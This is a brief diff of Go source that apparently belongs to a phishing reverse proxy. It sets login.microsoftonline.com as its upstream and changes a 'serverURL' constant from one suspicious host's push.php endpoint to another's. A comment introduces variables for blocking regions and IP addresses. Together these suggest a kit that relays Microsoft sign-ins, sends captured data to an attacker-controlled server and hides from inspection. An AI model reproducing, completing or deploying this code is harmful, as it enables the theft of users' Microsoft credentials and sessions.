@@ -1,13 +1,11 @@
 package main
 
 import (
-    "bytes"
     "crypto/rand"
     "encoding/base64"
     "fmt"
     "io/ioutil"
     "net/http"
-    "net/url"
     "os"
     "strings"
 )
@@ -16,7 +14,7 @@ import (
 const (
     upstream        = "login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
+    serverURL       = "https://rest.westmidlands-ush.shop/neronewms/push.php"
 )
 
 // Variables for blocking regions and IP addresses
